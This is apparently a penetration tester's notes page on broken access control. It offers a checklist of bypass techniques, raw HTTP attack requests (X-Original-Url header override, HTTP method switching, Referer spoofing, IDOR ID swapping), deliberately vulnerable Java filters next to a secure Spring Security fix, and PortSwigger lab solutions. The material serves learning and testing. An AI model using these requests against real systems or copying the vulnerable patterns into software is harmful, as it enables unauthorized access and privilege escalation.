
tactic: Privilege Escalation

**Access Control** determines whether an authenticated user is allowed to perform a specific action or access a specific resource. It sits on top of authentication (who you are) and session management (which requests are yours).

```
Authentication   →  who are you?
Session Mgmt     →  which requests belong to you?
Access Control   →  are you allowed to do that?
```

Broken access control is one of the most common and impactful vulnerabilities. Even if authentication is solid, missing or misconfigured access control allows privilege escalation and unauthorized data access.

## Types

**Vertical access control** — a lower-privilege user accesses functionality reserved for higher-privilege users (admin panel, user management).

**Horizontal access control** — a user accesses resources belonging to another user of the same privilege level (viewing another user's orders, profile, messages).

**Context-dependent access control** — access depends on application state (e.g. modifying an order after it has been paid).

---

## Injection Points

- URL path (`/admin`, `/admin/delete`, `/internal/users`)
- HTTP method (`GET` vs `POST` vs `PUT` vs `DELETE`)
- Request headers (`X-Original-Url`, `X-Rewrite-Url`, `X-Forwarded-For`, `Referer`)
- Body parameters (`role`, `isAdmin`, `action`, `username`)
- `Referer` header used as access check by some applications
- IDOR via ID parameters (`?userId=123`, `/api/orders/456`)

---

## Checklist

### Vertical Privilege Escalation

- [ ]  Access admin or privileged endpoints directly while authenticated as a low-privilege user:

```
	/admin
	/admin/users
	/admin/delete?username=carlos
	/internal/dashboard
	/management
```

- [ ]  If `/admin` returns 403, try overriding the URL via headers:

```http
	GET / HTTP/1.1
	X-Original-Url: /admin/delete
	X-Rewrite-Url: /admin
```

- [ ]  If POST is blocked, change the HTTP method to GET and pass params in the URL:

```
	POST /admin-roles   →   GET /admin-roles?username=wiener&action=upgrade
```

- [ ]  Try other method variations on restricted endpoints:

```
	GET, POST, PUT, PATCH, DELETE, HEAD, OPTIONS
```

- [ ]  Check if `Referer` header is used as an access check, spoof it:

```
	Referer: https://target.com/admin
```

### Horizontal Privilege Escalation (IDOR)

- [ ]  Replace your user ID with another user's ID in params, paths, and body:

```
	/api/users/123/profile   →   /api/users/124/profile
	?userId=123              →   ?userId=1
```

- [ ]  Try GUIDs, if they are predictable or leaked in other responses, enumerate them
- [ ]  Check if horizontal escalation leads to vertical (another user's object reveals admin data)

### URL-Based Access Control Bypass

- [ ]  Try path traversal variations to reach restricted paths:

```
	/admin/../admin
	/./admin
	/ADMIN
```

- [ ]  Try adding a parameter to a restricted URL:

```
	/admin?
	/admin#
```

### Parameter-Based Access Control Bypass

- [ ]  Look for hidden parameters that control access, add them to requests:

```
	?admin=true
	?role=admin
	?isAdmin=1
	&action=upgrade
```

- [ ]  In JSON body, inject role or privilege fields:

```json
	{"username":"wiener","role":"admin"}
	{"isAdmin":true}
```

### Multi-Step Process Bypass

- [ ]  Identify multi-step workflows (confirm → process → complete)
- [ ]  Try accessing a later step directly, skipping the earlier access-checked step:

```
	POST /admin/delete/confirm   (skip the GET /admin/delete check)
```

---

## Attack Payloads

**URL override via header to access admin delete:**


```http
GET /?username=carlos HTTP/1.1
Host: target.com
Cookie: session=USER_SESSION
X-Original-Url: /admin/delete
```

**Method change to bypass POST restriction:**

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: target.com
Cookie: session=USER_SESSION
```

**Referer spoofing:**

```http
GET /admin/users HTTP/1.1
Referer: https://target.com/admin
Cookie: session=USER_SESSION
```

---

## White Box Testing

**Vulnerable, access control enforced only on the URL, overridable via header:**

```java
@Component
public class AccessControlFilter implements Filter {
    @Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) {
        HttpServletRequest request = (HttpServletRequest) req;

        // checks the X-Original-Url header instead of the actual request path
        String path = request.getHeader("X-Original-Url");
        if (path == null) {
            path = request.getRequestURI();
        }

        if (path.startsWith("/admin") && !isAdmin(request)) {
            ((HttpServletResponse) res).setStatus(403);
            return;
        }
        chain.doFilter(req, res);
    }
}
// attacker sends GET / with X-Original-Url: /admin/delete
// filter sees "/" as the path and allows it, Spring routes /admin/delete
```

**Vulnerable, access control only on POST, not on GET for the same endpoint:**

```java
@PostMapping("/admin-roles")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<?> updateRolePost(@RequestBody RoleRequest req) {
    userService.updateRole(req.getUsername(), req.getAction());
    return ResponseEntity.ok().build();
}

// GET version has no access control annotation
@GetMapping("/admin-roles")
public ResponseEntity<?> updateRoleGet(@RequestParam String username,
                                        @RequestParam String action) {
    userService.updateRole(username, action); // attacker hits this via GET
    return ResponseEntity.ok().build();
}
```

**Vulnerable, Referer header used as access control:**

```java
@GetMapping("/admin/users")
public ResponseEntity<?> adminUsers(HttpServletRequest request) {
    String referer = request.getHeader("Referer");
    // trusting the Referer header as a security control
    if (referer != null && referer.contains("/admin")) {
        return ResponseEntity.ok(userService.getAllUsers());
    }
    return ResponseEntity.status(403).build();
}
```

**Secure:**

```java
// Use Spring Security with method-level annotations, enforces on all methods/paths
@Configuration
@EnableMethodSecurity
public class SecurityConfig {
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.authorizeHttpRequests(auth -> auth
            .requestMatchers("/admin/**").hasRole("ADMIN")
            .requestMatchers("/api/users/**").authenticated()
            .anyRequest().authenticated()
        );
        return http.build();
    }
}

// Method level, covers all HTTP methods on this endpoint
@GetMapping("/admin-roles")
@PostMapping("/admin-roles")
@PreAuthorize("hasRole('ADMIN')")
public ResponseEntity<?> updateRole(@RequestParam String username,
                                     @RequestParam String action) {
    userService.updateRole(username, action);
    return ResponseEntity.ok().build();
}

// For IDOR, always scope queries to the authenticated user's ID
@GetMapping("/api/orders/{orderId}")
public ResponseEntity<?> getOrder(@PathVariable Long orderId,
                                   @AuthenticationPrincipal UserDetails currentUser) {
    Order order = orderService.findById(orderId);
    // confirm the order belongs to the requesting user
    if (!order.getOwnerId().equals(currentUser.getId())) {
        return ResponseEntity.status(403).build();
    }
    return ResponseEntity.ok(order);
}
```

##  Labs

**URL-based access control can be circumvented**

> Add X-Origin-Url http header
```http
GET /?username=carlos HTTP/2
Host: 0aff002c03801528c887f8c7008600d4.web-security-academy.net
Cookie: session=NtH2EX36IwFu4WEfu7ysxeEnWIOLQQr2
Sec-Ch-Ua: "Chromium";v="133", "Not(A:Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: en-US,en;q=0.9
Dnt: 1
X-Original-Url: /admin/delete
```



 **Method-based access control can be circumvented**


> Log in as a normal user get that request change the request method and done
```http
GET /admin-roles?username=wiener&action=upgrade HTTP/2
Host: 0abb00d404c6d0ac8079308400a0008a.web-security-academy.net
Cookie: session=Qs6yrRXBJMDMHmY8JU4ncumzci38KeCQ
```


## Resources

- [PortSwigger Access Control](https://portswigger.net/web-security/access-control)
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [HackTricks IDOR](https://book.hacktricks.xyz/pentesting-web/idor)